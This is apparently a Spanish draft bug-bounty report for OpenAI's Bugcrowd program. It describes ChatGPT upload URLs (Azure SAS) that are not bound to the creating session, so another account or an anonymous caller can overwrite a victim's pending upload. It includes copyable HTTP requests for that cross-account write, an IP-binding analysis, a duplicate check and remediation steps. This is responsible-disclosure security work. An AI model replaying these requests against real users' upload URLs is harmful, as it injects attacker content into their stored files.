# BORRADOR — Reporte E13 (NO enviado — pendiente check de duplicados + scope del host de almacenamiento)

**Fecha:** 2026-09-06 · **Programa:** OpenAI (Bugcrowd) · **Estado:** BORRADOR · **Guía:** `GUIA_INFORMES_BUGBOUNTY.html` §11

---

**Título (EN):** Upload SAS URL issued by `POST /files` is not bound to the creating session — replayable, usable by another account and anonymously, allowing content injection into the victim's library file

**Título (ES):** La URL firmada de subida de `POST /files` no está ligada a la sesión creadora — replayable, usable desde otra cuenta y de forma anónima, permitiendo inyectar contenido en el archivo de la biblioteca de la víctima

**Severidad propuesta:** LOW · CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` (4.3) — con la reserva de que el atacante debe poseer la capability URL.

---

## Descripción (3-5 líneas)

Al crear una reserva de subida (`POST /backend-api/files/upload_reservations`), el backend devuelve una URL firmada (SAS) para escribir el blob. **Esa URL no está ligada a la sesión que la creó**: acepta múltiples PUT (replay), PUT desde otra cuenta autenticada y PUT sin cookies. El contenido del último PUT persiste en el archivo cuando el propietario legitimo la reclamación (`claim_and_finish`): un actor que obtenga la `upload_url` de una víctima puede **sobrescribir el contenido de su subida pendiente** y, por tanto, **plantar bytes controlados en el archivo de su biblioteca** (integridad de contenido cross-account). No hay exfiltración ni transferencia de propiedad (verificado).

## Pasos de reproducción

1. Crear cuenta A (`test-a@…`) y cuenta B (`test-b@…`). Ambos `user.id` distintos en `/api/auth/session`; obtener `accessToken` de cada una.
2. **Cuenta B** crea una reserva (respuesta 200 con `reservation_id` y `upload_url` SAS):
   ```
   POST https://chatgpt.com/backend-api/files/upload_reservations
   Authorization: Bearer <token_B>
   {"intended_use_case":"my_files","entry_surface":"context_connector_upload",
    "requires_gizmo_id":false,"store_in_library":true,"library_persistence_mode":"required"}
   → {"reservation_id":"file_…","upload_url":"https://sdmntp….oaiusercontent.com/files/…/raw?se=…&sp=w&sv=…&sr=b&scid=…&sig=…"}
   ```
3. **Cuenta B** sube su contenido legítimo: `PUT <upload_url>` body `SYNTHETIC-B-FIRST …` → **201**.
4. **Cuenta A (otra sesión, otro user.id)**: `PUT <upload_url_de_B>` body `SYNTHETIC-A-INJECTED by account A` → **201** *(reproducido 2×)*. También sin cookies → **201**.
5. **Cuenta B** reclama su reserva con el tamaño real del blob:
   ```
   POST https://chatgpt.com/backend-api/files/upload_reservations/{reservation_id}/claim_and_finish
   {"file_name":"…","file_size":34,"use_case":"my_files","index_for_retrieval":false,
    "store_in_library":true,"library_persistence_mode":"required"}
   → 200 {"file_id":"file_…","event":"file.processing.started"}
   ```
6. `GET /backend-api/files/{file_id}` → 200 `{owner_id: <B>, state: "ready", size: 34}`. El archivo aparece en los nodos de B: `GET /backend-api/files/library/nodes` → `libfile_…` name `SYNTHETIC-B-CLAIMED-R3.txt`, state `ready`.
7. **Verdad de fondo:** B pide `GET /backend-api/files/library/files/{libfile}/content_url` (200) y descarga el blob con sus cookies+Bearer → **cuerpo = `SYNTHETIC-A-INJECTED by account A`** — el contenido escrito por la cuenta A quedó persistido en el archivo de la biblioteca de B.
8. (Control negativo) A intenta leer el archivo de B: detalle y content_url → **404** ambos. A reclama la reserva de B → 200 eco idempotente **sin** transferencia de propiedad (el archivo sigue en la biblioteca de B).

## Peticiones HTTP completas (copiables)

```
# 1) Reserva (B) → upload_url
POST /backend-api/files/upload_reservations HTTP/1.1
Host: chatgpt.com
Authorization: Bearer <TOKEN_B>
Content-Type: application/json

{"intended_use_case":"my_files","entry_surface":"context_connector_upload","requires_gizmo_id":false,"store_in_library":true,"library_persistence_mode":"required"}

# 2) Escritura CROSS-ACCOUNT sobre la upload_url de B (A ≠ B)
PUT /files/00000000-8f34-81f4-adf1-a86ebfdfde62/raw?se=2026-09-06T05%3A11%3A58Z&sp=w&sv=2026-02-06&sr=b&scid=…&sig=… HTTP/1.1
Host: sdmntprnortheu.oaiusercontent.com
Content-Type: text/plain
x-ms-blob-type: BlockBlob

SYNTHETIC-A-INJECTED by account A
→ HTTP 201

# 3) Claim legítimo de B
POST /backend-api/files/upload_reservations/file_000000008f3481f4adf1a86ebfdfde62/claim_and_finish HTTP/1.1
Host: chatgpt.com
Authorization: Bearer <TOKEN_B>

{"file_name":"SYNTHETIC-B-CLAIMED-R3.txt","file_size":34,"use_case":"my_files","index_for_retrieval":false,"store_in_library":true,"library_persistence_mode":"required"}
→ 200 {"file_id":"file_000000008f3481f4adf1a86ebfdfde62","event":"file.processing.started"}

# 4) Verdad de fondo: B descarga SU archivo → contenido de A
GET /backend-api/files/library/files/{libfile}/content_url HTTP/1.1
Authorization: Bearer <TOKEN_B>
→ 200 {"content_url":"https://chatgpt.com/backend-api/estuary/content?id=file_…&sig=…"}
GET <content_url> (con cookies+Bearer de B)
→ 200 "SYNTHETIC-A-INJECTED by account A"
```

## Evidencia

- Request/response crudo de las 3 rondas: `evidencia-poc/http/sas-upload-raw.txt`, `sas-upload-probe-resultado.json`, `sas-round3-resultado.json`
- Verdad de fondo (blob = A-INJECTED): `evidencia-poc/http/sas-round3-contenido.txt`
- Solo cuentas propias A/B, recursos `SYNTHETIC-*`, ritmo ≥2,2 s, sin enumeración; recurso final eliminado (DELETE 200).
- Nota: las cuentas A y B operan desde la misma red/IP; la prueba no puede descartar binding por IP (pero la escritura anónima con cookies nulas desde esa IP sí está probada).

## Impacto

Un atacante que obtenga la `upload_url` de una víctima —filtración típica por proxy corporativo, historial del navegador, logs de servidor, capturas/herramientas de extensión, o un futuro IDOR que liste reservas— puede **sobrescribir el contenido de la subida pendiente** y **plantar bytes propios en el archivo de la biblioteca de la víctima** antes de que ésta la reclame. El archivo reclamado (y cualquier uso posterior: adjuntarlo a mensajes, compartirlo, incluirlo en un GPT/agente) contendrá contenido del atacante: **envenenamiento de contenido almacenado / violación de integridad de datos del usuario**. No se exfiltran datos y la propiedad del archivo permanece en la víctima (límite del impacto).

La expectativa de seguridad razonable en un servicio de subida es que la capability de escritura esté ligada a la sesión creadora y/o sea de un solo uso; el parámetro `scid=` (client-id firmado) sugiere que se intentó un binding que **no se ejecuta** contra la identidad de quien hace el PUT.

## Anexo A — Análisis de binding por IP de la SAS (2026-09-06)

### Resultado estático (decisivo en la construcción Azure)

La `upload_url` es una **Azure user-delegation SAS** (parámetros `skoid/sktid/skt/ske/sks/skv`
= firma por clave de delegación del usuario) con:

| Parámetro | Valor | Significado |
|---|---|---|
| `se` | ~5 min tras la creación (301 s medidos) | Ventana de expiración **corta** — mitigación real |
| `sp` | `w` | Solo escritura |
| `sr` | `b` | Recurso: blob |
| `skoid/sktid/skt/ske/sks` | delegación | Firma por user-delegation key (vida de clave 17 h, no de la SAS) |
| `scid` | UUID (`e9fc5620-…`) | Client-id firmado — **NO liga la sesión** (probado: PUT de A y anónimo → 201) |
| `sig` | HMAC 44 chars | Firma sobre key+recurso+permisos+expiración |
| **`sip` / `sipr`** | **AUSENTES** | **El mecanismo nativo de binding por IP de Azure (claim `sip`) no está firmado** |

En Azure SAS, la restricción de IP solo existe si el claim `sip` (y opcionalmente
`sipr`) forma parte de la firma. **Su ausencia significa que la SAS no está ligada
a IP por construcción.** El único binding posible sería un chequeo *custom* del
proxy de OpenAI (`sdmntp*.oaiusercontent.com`) que comparara la IP del PUT contra
la IP del creador de la reserva — hipótesis que no se puede descartar ni confirmar
sin un egress distinto (ver limitación abajo).

### Limitación del entorno y prueba pendiente (procedimiento limpio)

Entorno actual: **sin IPv6** (curl -6 sin respuesta), **sin proxy configurado**,
**sin VBoxManage accesible** (VM `knk-bounty-ova` no arrancada/accesible desde este
shell), **sin docker/tor/tailscale/openvpn/wg** en PATH. Las cuentas A y B operan
con el mismo egress (`90.173.225.104`), por lo que las pruebas existentes
(control anónimo misma-IP → 201) no distinguen binding por IP de ausencia total
de binding.

**Procedimiento limpio para confirmar/descartar desde otra red** (2 pasos):

```bash
# PASO 1 — desde la red ACTUAL (control):
#   node backend/ab-sas-upload-probe.js   (o el script del anexo B)
#   → esperado: PUT anónimo → 201

# PASO 2 — desde OTRA red (Kali VM con su propio NAT/VPN, o hotspot móvil):
#   repetir la sonda; el PUT anónimo debe usar la upload_url recién creada
#   desde la red original (ventana de ~5 min).
#   → 201: la SAS NO está ligada a IP → E13 se mantiene tal cual
#     (capability pura: quien tenga la URL dentro de la ventana puede escribir)
#   → 401/403: hay pinning de IP server-side → E13 se debilita a
#     "atacante en la misma red", documentarlo y reconsiderar severidad
```

### Qué aporta al E13

- La ausencia de `sip` refuerza el hallazgo: la capability es pura por
  construcción, y el único candidato a control residual (pinning custom de IP)
  queda **pendiente de una prueba de egress distinto** que el entorno actual no
  permite ejecutar.
- La ventana de expiración de ~5 min es una mitigación a declarar en el informe
  (los vectores de fuga de la URL —proxy corporativo, historial, logs, capturas—
  la capturan en tiempo real, pero reduce el reuso diferido).
- Evidencia: `evidencia-poc/http/sas-ip-binding-analisis.txt` (URL completa y
  params) + control anónimo 201.

## Checklist de panel (pre-submit)

`docs/bugbounty/CHECKLIST-PANEL-E13-PRE-SUBMIT-2026-09-06.md` — pasos exactos de
Known Issues, duplicados y scope de `*.oaiusercontent.com`, con tabla de decisión
y checklist §11.

## Anexo B — Check de duplicados (2026-09-06)

### Superficie pública — NO se encontró duplicado

Revisados: programa Bugcrowd de OpenAI (página pública, política completa
incluyendo Rules of Engagement y out-of-scope), disclosures públicos de 2026,
writeups de research, CVE/GHSA y referencias al host de almacenamiento
(`sdmntp*.oaiusercontent.com`, `files.oaiusercontent.com`).

| Fuente | Resultado |
|---|---|
| Política del programa (Bugcrowd) | Extraída completa. No menciona file upload/SAS; el out-of-scope son model issues, jailbreaks, sandboxes de código (Python/Agent Mode/Container Tool) — **nada relacionado con subida de archivos** |
| Disclosures OpenAI 2026 | DNS-side-channel exfiltration (patch 2026-02-20) y Codex GitHub-token (patch 2026-02-05) — **clases distintas** (exfiltración desde conversación / lateral movement en Codex), ninguna toca la reserva de subida ni la SAS de escritura |
| Research público histórico | XSS→ATO (Imperva 2024), cache-poisoning ATO (2024), plugins/Salt Labs (2024), incidente Redis (2023) — ninguno sobre `upload_reservations` / `claim_and_finish` / SAS `sp=w` |
| Host de almacenamiento | Sin writeups de seguridad sobre `sdmntp*.oaiusercontent.com` ni sobre binding/replay de sus SAS. (Los `files.oaiusercontent.com/file-…?se=…` públicos en foros son la cara de DESCARGA compartida, por diseño, no la reserva de subida `sp=w` del E13) |
| Endpoint `upload_reservations`/`claim_and_finish` | Cero menciones públicas |

La clase genérica (presigned/SAS URL multi-uso y replay) es conocida en cloud
security (Detectify, Palo Alto) — pero **no hay evidencia de que el flujo concreto
de ChatGPT haya sido reportado/disclosado públicamente**. Riesgo de duplicado
bajo en la superficie pública.

### Superficie autenticada — pendiente (solo con tu login)

Bugcrowd no expone los Known Issues ni el changelog sin sesión (401 en
`engagement_known_issues.json`; changelog/announcements sin datos), y no hay
sesión de Bugcrowd en los navegadores accesibles (Edge 9336 solo tiene tabs de
chatgpt.com). **Antes de enviar, comprobar en el panel:**

1. Pestaña **"Known Issues"** del programa OpenAI (si existe, lista lo ya
   conocido/aceptado por OpenAI).
2. Tu historial de submissions por si ya enviaste algo relacionado.
3. Pestaña **"Disclosures"** / reportes aceptados públicos del programa.
4. Confirmar la pestaña **"Targets"**: que `chatgpt.com` (y en su caso
   `*.oaiusercontent.com`) estén en scope. La vulnerabilidad se materializa en
   el diseño del API de `chatgpt.com` (emite la capability no ligada); el host
   de almacenamiento es donde la capability se ejecuta. Si `oaiusercontent.com`
   estuviera fuera de scope, argumentar el lado `chatgpt.com` del flujo.

## Remediación sugerida

1. **SAS de un solo uso:** invalidar la `upload_url` tras el primer PUT con éxito (o limitar el número de escrituras).
2. **Binding a la sesión:** validar en el servicio de almacenamiento que el principal autenticado del PUT coincide con el propietario de la reserva (o exigir token de sesión, no solo firma de URL).
3. Reducir aún más la ventana de expiración (ya corta) y no incluir `scid`/claims no verificados.

## Checklist previo al envío (pendiente)

- [ ] Comprobar **duplicados** en el panel de Bugcrowd (mecánica de reservas/SAS de subida).
- [ ] Confirmar **scope** del host de almacenamiento (`*.oaiusercontent.com`) y del endpoint `files/upload_reservations` en la política del programa.
- [ ] Redactar versión final EN siguiendo guía §11 y adjuntar request/response crudos + captura del contenido del blob.
- [ ] Replicar 2× desde estado limpio (ya hecho: 3 rondas) y decidir severidad final con el equipo antes de enviar.

---

**Estado:** CANDIDATO (E13) — no enviado. El hallazgo técnico es sólido y reproducible; la decisión de envío depende del check de duplicados, del scope del host de almacenamiento y de la política de impacto de OpenAI.

> ✅ **Versión final EN lista para pegar en Bugcrowd:** `OPENAI-REPORTE-E13-EN-FINAL-2026-09-06.md`
> (título, CVSS, pasos, raw HTTP copiable, evidencia, impacto, remediación, limitación de IP y nota de scope).